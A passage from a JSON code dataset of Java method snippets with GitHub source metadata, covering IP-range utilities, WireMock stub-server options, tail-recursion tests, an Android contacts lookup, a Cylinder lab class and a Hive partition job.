"https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56481, "method_name": "instersect", "class_name": "IpAddress", "params": ["byte", "byte", "byte", "byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean instersect ( byte [] addressFrom, byte[] addressTo, byte [] addressFrom2, byte[] addressTo2 )\n\t{\n\t\tif ( addressFrom == null || addressTo == null || addressFrom2 == null || addressTo2 == null )\n\t\t{\n\t\t\tthrow new NullPointerException();\n\t\t}\n\t\t\t\n\t\treturn compare( addressFrom, addressTo2  ) <= 0 && \n\t\t\tcompare( addressTo, addressFrom2 ) >= 0 ;\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56482, "method_name": "rangeInRange", "class_name": "IpAddress", "params": ["byte", "byte", "byte", "byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean rangeInRange ( byte [] addressFrom, byte[] addressTo, byte [] addressFrom2, byte[] addressTo2 )\n\t{\n\t\tif ( addressFrom == null || addressTo == null || addressFrom2 == null || addressTo2 == null )\n\t\t{\n\t\t\tthrow new NullPointerException();\n\t\t}\n\n\t\treturn IpAddress.compare( addressFrom, addressFrom2  ) <= 0  &&\t\t\t\t \n\t\t\tIpAddress.compare( addressTo, addressTo2 ) >= 0  ;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56483, "method_name": "ipInRange", "class_name": "IpAddress", "params": ["byte", "byte", "byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean ipInRange (  byte [] ip, byte [] addressFrom, byte[] addressTo )\n\t{\n\t\treturn compare( addressFrom, ip  ) <=0  &&\t\t\t\t \n\t\t\tcompare( addressTo, ip  )  >=0   ;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56484, "method_name": "convertIp4AddresToBigInt", "class_name": "IpAddress", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "BigInteger", "snippet": "\tpublic static BigInteger convertIp4AddresToBigInt( byte[] address )\n\t{\n\t\t/*\n\t\t * \u0423 BigInteger - \u0435\u0441\u0442\u044c \u0445\u0438\u0442\u0440\u0430\u044f \u043e\u0441\u043e\u0431\u0435\u043d\u043d\u043e\u0441\u0442\u044c , \u043e\u043d \u0445\u0440\u0430\u043d\u0438\u0442 \u043e\u0442\u0440\u0438\u0446\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u0447\u0438\u0441\u043b\u0430 \u0432 \u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u043c \u043a\u043e\u0434\u0435\n\t\t * \u0418 \u0447\u0442\u043e\u0431\u044b \u043e\u0442\u043b\u0438\u0447\u0438\u0442\u044c \u043f\u043e\u043b\u043e\u0436\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e, \u0443 \u043a\u043e\u0442\u043e\u0440\u043e\u0433\u043e \u0432 \u043a\u0440\u0430\u0439\u043d\u0435\u043c \u043f\u0440\u0430\u0432\u043e\u043c  \u043b\u0435\u0432\u043e\u043c \u0431\u0438\u0442\u0435 \u0441\u0442\u043e\u0438\u0442 0,  \u043e\u0442 \u043e\u0442\u0440\u0438\u0446\u0438\u0430\u0442\u0435\u043b\u044c\u043d\u043e\u0433\u043e\n\t\t *\t\u043e\u043d \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u0442 \u0435\u0449\u0435 \u043e\u0434\u0438\u043d \u0431\u0430\u0439\u0442 \u0441\u043b\u0435\u0432\u0430. \n\t\t */\n\t\tbyte[] address2 = new byte[ address [0] <  0 ? 5: 4 ];\t\t\t\t\n\t\tSystem.arraycopy( address, 0, address2, address [0] <  0 ? 1 : 0, 4 );\n\t\t\n\t\treturn new BigInteger( address2 );\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56485, "method_name": "convertBigIntToIp4Address", "class_name": "IpAddress", "params": ["BigInteger"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "\tpublic static byte[] convertBigIntToIp4Address( BigInteger bigInteger  )\n\t{\n\t\tbyte[] address = bigInteger.toByteArray();\n\t\t\n\t\t/*\n\t\t *  \u0423 BigInteger - \u0435\u0441\u0442\u044c \u0445\u0438\u0442\u0440\u0430\u044f \u043e\u0441\u043e\u0431\u0435\u043d\u043d\u043e\u0441\u0442\u044c , \u043e\u043d \u0445\u0440\u0430\u043d\u0438\u0442 \u043e\u0442\u0440\u0438\u0446\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u0447\u0438\u0441\u043b\u0430 \u0432 \u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u043c \u043a\u043e\u0434\u0435\n\t\t * \u0418 \u0447\u0442\u043e\u0431\u044b \u043e\u0442\u043b\u0438\u0447\u0438\u0442\u044c \u043f\u043e\u043b\u043e\u0436\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e, \u0443 \u043a\u043e\u0442\u043e\u0440\u043e\u0433\u043e \u0432 \u043a\u0440\u0430\u0439\u043d\u0435\u043c \u043f\u0440\u0430\u0432\u043e\u043c  \u043b\u0435\u0432\u043e\u043c \u0431\u0438\u0442\u0435 \u0441\u0442\u043e\u0438\u0442 0,  \u043e\u0442 \u043e\u0442\u0440\u0438\u0446\u0438\u0430\u0442\u0435\u043b\u044c\u043d\u043e\u0433\u043e\n\t\t * \u043e\u043d \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u0442 \u0435\u0449\u0435 \u043e\u0434\u0438\u043d \u0431\u0430\u0439\u0442 \u0441\u043b\u0435\u0432\u0430.\n\t\t */\n\t\tbyte[] address2 = {0, 0, 0, 0 };\n\t\tSystem.arraycopy( address, address.length  == 5 ? 1 : 0, address2, address.length  == 5 ? 0: (4 - address.length), address.length  == 5 ? 4 : address.length );\n\t\t\t\t\n\t\treturn address2;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56486, "method_name": "formatRange", "class_name": "IpAddress", "params": ["IpAddress", "IpAddress"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String formatRange( IpAddress from, IpAddress to )\n\t{\n\t\tStringBuilder result = new StringBuilder( 50 );\n\t\t\n\t\tif( to == null )\n\t\t{\n\t\t\tresult.append( from );\n\t\t}\n\t\telse\n\t\t{\n\t\t\tresult.append( from );\n\t\t\tresult.append( \"-\" );\n\t\t\tresult.append( to );\n\t\t}\n\t\t\n\t\treturn result.toString();\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56487, "method_name": "formatRange", "class_name": "IpAddress", "params": ["byte", "byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String formatRange( byte[] from, byte[] to )\n\t{\n\t\tStringBuilder result = new StringBuilder( 50 );\n\t\t\n\t\tif( to == null )\n\t\t{\n\t\t\tresult.append( toString( from ) );\n\t\t}\n\t\telse\n\t\t{\n\t\t\tresult.append( toString( from ) );\n\t\t\tresult.append( \"-\" );\n\t\t\tresult.append( toString( to ) );\n\t\t}\n\t\t\n\t\treturn result.toString();\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56488, "method_name": "adapt", "class_name": "ResultSetToVipAdapter", "params": ["ResultSet"], "throws": null, "modifiers": ["public"], "return_type": "Vip", "snippet": "    public Vip adapt(ResultSet resultSet) {\n        try {\n\n            VipType type = VIP_TYPE_CACHE.find(resultSet.getString(\"type\"));\n            long time = resultSet.getLong(\"time\");\n\n            return Vip\n                    .builder()\n                    .type(type)\n                    .time(time)\n                    .build();\n\n        } catch (Exception exception) {\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/adapter/ResultSetToVipAdapter.java", "stars": "2", "class_props": {"extends": null, "implements": ["ObjectAdapter"], "modifiers": ["public"]}}, {"id": 56489, "method_name": "addExtensions", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void addExtensions() {\n    JcrFileReader jcrFileReader = new JcrFileReader(resolverAccessor, rootPath);\n    extensions.putAll(ExtensionLoader.asMap(\n      Collections.singletonList(new PebbleTransformer(jcrFileReader, globalTransformer)))\n    );\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56490, "method_name": "portNumber", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int portNumber() {\n    return 0;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56491, "method_name": "httpsSettings", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "HttpsSettings", "snippet": "  public HttpsSettings httpsSettings() {\n    return new HttpsSettings(-1, \"\", \"\", \"\", null, \"\", \"\", false);\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56492, "method_name": "jettySettings", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JettySettings", "snippet": "  public JettySettings jettySettings() {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56493, "method_name": "containerThreads", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int containerThreads() {\n    return 0;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56494, "method_name": "browserProxyingEnabled", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean browserProxyingEnabled() {\n    return false;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56495, "method_name": "proxyVia", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ProxySettings", "snippet": "  public ProxySettings proxyVia() {\n    return ProxySettings.NO_PROXY;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56496, "method_name": "filesRoot", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "FileSource", "snippet": "  public FileSource filesRoot() {\n    return new WireMockFileSource(resolverAccessor, rootPath);\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56497, "method_name": "mappingsLoader", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MappingsLoader", "snippet": "  public MappingsLoader mappingsLoader() {\n    return stubMappings -> {}; // intentionally, loading is just done later\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56498, "method_name": "mappingsSaver", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MappingsSaver", "snippet": "  public MappingsSaver mappingsSaver() {\n    return new NotImplementedMappingsSaver();\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56499, "method_name": "notifier", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Notifier", "snippet": "  public Notifier notifier() {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56500, "method_name": "requestJournalDisabled", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean requestJournalDisabled() {\n    return false;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56501, "method_name": "maxRequestJournalEntries", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Optional<Integer>", "snippet": "  public Optional<Integer> maxRequestJournalEntries() {\n    return Optional.absent();\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56502, "method_name": "bindAddress", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String bindAddress() {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56503, "method_name": "matchingHeaders", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<CaseInsensitiveKey>", "snippet": "  public List<CaseInsensitiveKey> matchingHeaders() {\n    return Collections.emptyList();\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56504, "method_name": "shouldPreserveHostHeader", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean shouldPreserveHostHeader() {\n    return false;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56505, "method_name": "proxyHostHeader", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String proxyHostHeader() {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56506, "method_name": "httpServerFactory", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "HttpServerFactory", "snippet": "  public HttpServerFactory httpServerFactory() {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56507, "method_name": "threadPoolFactory", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ThreadPoolFactory", "snippet": "  public ThreadPoolFactory threadPoolFactory() {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56508, "method_name": "extensionsOfType", "class_name": "WireMockOptions", "params": ["Class<T>"], "throws": null, "modifiers": ["public"], "return_type": "Map<String,T>", "snippet": "  public <T extends Extension> Map<String, T> extensionsOfType(final Class<T> extensionType) {\n    return (Map<String, T>) Maps.filterEntries(extensions, valueAssignableFrom(extensionType));\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56509, "method_name": "networkTrafficListener", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "WiremockNetworkTrafficListener", "snippet": "  public WiremockNetworkTrafficListener networkTrafficListener() {\n    return new DoNothingWiremockNetworkTrafficListener();\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56510, "method_name": "getAdminAuthenticator", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Authenticator", "snippet": "  public Authenticator getAdminAuthenticator() {\n    return new NoAuthenticator();\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56511, "method_name": "getHttpsRequiredForAdminApi", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean getHttpsRequiredForAdminApi() {\n    return false;\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56512, "method_name": "getNotMatchedRenderer", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "NotMatchedRenderer", "snippet": "  public NotMatchedRenderer getNotMatchedRenderer() {\n    return new PlainTextStubNotMatchedRenderer();\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56513, "method_name": "getAsynchronousResponseSettings", "class_name": "WireMockOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AsynchronousResponseSettings", "snippet": "  public AsynchronousResponseSettings getAsynchronousResponseSettings() {\n    return new AsynchronousResponseSettings(false, 0);\n  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockOptions.java", "stars": "8", "class_props": {"extends": null, "implements": ["Options"], "modifiers": []}}, {"id": 56514, "method_name": "runTest", "class_name": "GetFieldReturnPathTest", "params": ["Map<String,String>"], "throws": ["Throwable"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void runTest(Map<String, String> parameters) throws Throwable {\n\t\toptimizeClass(Fielded.class);\n\t\t//the getfield instruction has been optimized away\n\t\tassertSuccessfulOptimizationWithException(TestMethods.class.getMethod(\"count\", int.class, Fielded.class),\n\t\t\t\tNullPointerException.class, 1, null);\n\t\tassertSuccessfulOptimization(TestMethods.class.getMethod(\"count\", int.class, Fielded.class), 10000000, null);\n\t\tassertSuccessfulOptimization(TestMethods.class.getMethod(\"count\", long.class, Fielded.class), 10000000, null);\n\t}", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/test/src/testing/sipka/jvm/tailrec/GetFieldReturnPathTest.java", "stars": "97", "class_props": {"extends": "TailRecOptimizerTestCase", "implements": null, "modifiers": ["public"]}}, {"id": 56515, "method_name": "count", "class_name": "TestMethods", "params": ["int", "Fielded"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\t\tpublic static int count(int n, Fielded m) {\n\t\t\tif (n == 0) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tint v = count(n - 1, m);\n\t\t\tObject x = m.o;\n\t\t\treturn v;\n\t\t}", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/test/src/testing/sipka/jvm/tailrec/GetFieldReturnPathTest.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56516, "method_name": "count", "class_name": "TestMethods", "params": ["long", "Fielded"], "throws": null, "modifiers": ["public", "static"], "return_type": "long", "snippet": "\t\tpublic static long count(long n, Fielded m) {\n\t\t\tif (n == 0) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tlong v = count(n - 1, m);\n\t\t\tObject x = m.o;\n\t\t\treturn v;\n\t\t}", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/test/src/testing/sipka/jvm/tailrec/GetFieldReturnPathTest.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 56517, "method_name": "run", "class_name": "getcontacts", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n        Cursor phones = s.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);\n        while (phones.moveToNext()) {\n            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));\n            phoneNumber=phoneNumber.replaceAll(\"\\\\D\", \"\");\n            if (phoneNumber.length()<9){\n                continue;\n            }\n            if (phoneNumber.substring(0,2).equals(\"91\"))\n                pnumber[i] =phoneNumber.substring(2);\n            else{\n                pnumber[i]=phoneNumber;\n            }\n            i++;\n        }\n        DatabaseReference df = FirebaseDatabase.getInstance().getReference(\"Phonenumbers\");\n\n        for ( j = 0; j < i; j++) {\n            System.out.println(i);\n            System.out.println(j);\n            System.out.println(pnumber[j]);\n            final String num=pnumber[j];\n            df.child(pnumber[j]).addValueEventListener(new ValueEventListener() {\n                @Override\n                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {\n                    if (dataSnapshot.getValue()!=null){\n                        name=dataSnapshot.getValue().toString();\n                        System.out.println(name);\n                        dcontacts.put(name,num);\n                        System.out.println(num);\n                    }\n\n\n                }\n\n                @Override\n                public void onCancelled(@NonNull DatabaseError databaseError) {\n\n                }\n            });\n\n        }\n\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/getcontacts.java", "stars": "2", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 56518, "method_name": "onCreate", "class_name": "WebviewTestActivity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_webview_test);\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_webview/src/main/java/com/hl/lib_webview/WebviewTestActivity.java", "stars": "14", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 56519, "method_name": "getAzkanbanBuilder", "class_name": "JobBuilder", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "AzkanbanBuilder", "snippet": "    public static AzkanbanBuilder getAzkanbanBuilder(){\n        return azkanbanBuilder;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/linkis/job/JobBuilder.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56520, "method_name": "getHeight", "class_name": "Cylinder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getHeight() {\n        return height;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Cylinder.java", "stars": "2", "class_props": {"extends": "AbstractForm", "implements": null, "modifiers": ["public"]}}, {"id": 56521, "method_name": "setHeight", "class_name": "Cylinder", "params": ["float"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHeight(float height) throws Exception {\n        if (5 > height || height > 20)\n            throw new Exception(\"Height of Cylinder should be in range from 5 to 20 m\");\n\n        this.height = height;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Cylinder.java", "stars": "2", "class_props": {"extends": "AbstractForm", "implements": null, "modifiers": ["public"]}}, {"id": 56522, "method_name": "getDiameter", "class_name": "Cylinder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getDiameter() {\n        return diameter;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Cylinder.java", "stars": "2", "class_props": {"extends": "AbstractForm", "implements": null, "modifiers": ["public"]}}, {"id": 56523, "method_name": "setDiameter", "class_name": "Cylinder", "params": ["float"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDiameter(float diameter) throws Exception {\n        if (5 > diameter || diameter > 10)\n            throw new Exception(\"Diameter of Cylinder should be in range from 5 to 10 m\");\n\n        this.diameter = diameter;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Cylinder.java", "stars": "2", "class_props": {"extends": "AbstractForm", "implements": null, "modifiers": ["public"]}}, {"id": 56524, "method_name": "volume", "class_name": "Cylinder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float volume() {\n        return (float) (Math.PI * Math.pow(diameter / 2d, 2d)) * height;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Cylinder.java", "stars": "2", "class_props": {"extends": "AbstractForm", "implements": null, "modifiers": ["public"]}}, {"id": 56525, "method_name": "weight", "class_name": "Cylinder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float weight() {\n        return volume() * wood.getDensity();\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Cylinder.java", "stars": "2", "class_props": {"extends": "AbstractForm", "implements": null, "modifiers": ["public"]}}, {"id": 56526, "method_name": "toString", "class_name": "Cylinder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"Cylinder{\" +\n                \"wood=\" + getWood() +\n                \", diameter=\" + diameter +\n                \", height=\" + height +\n                '}';\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Cylinder.java", "stars": "2", "class_props": {"extends": "AbstractForm", "implements": null, "modifiers": ["public"]}}, {"id": 56527, "method_name": "execute", "class_name": "DropAllPartitionsAddLatest", "params": [], "throws": ["HiveViaAzkabanException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void execute() throws HiveViaAzkabanException {\n    ArrayList<HQL> hql = new ArrayList<HQL>();\n    hql.add(new UseDatabaseHQL(database));\n\n    Configuration conf = new Configuration();\n    try {\n      FileSystem fs = FileSystem.get(conf);\n\n      for (String table : tables) {\n        LOG.info(\"Determining HQL commands for table \" + table);\n        hql.addAll(addAndDrop(fs, tableLocations, table));\n      }\n      fs.close();\n    } catch (IOException e) {\n      throw new HiveViaAzkabanException(\n          \"Exception fetching the directories/partitions from HDFS\", e);\n    }\n\n    StringBuffer query = new StringBuffer();\n    for (HQL q : hql) {\n      query.append(q.toHQL()).append(\"\\n\");\n    }\n\n    System.out.println(\"Query to execute:\\n\" + query.toString());\n    try {\n      hqe.executeQuery(query.toString());\n    } catch (HiveQueryExecutionException e) {\n      throw new 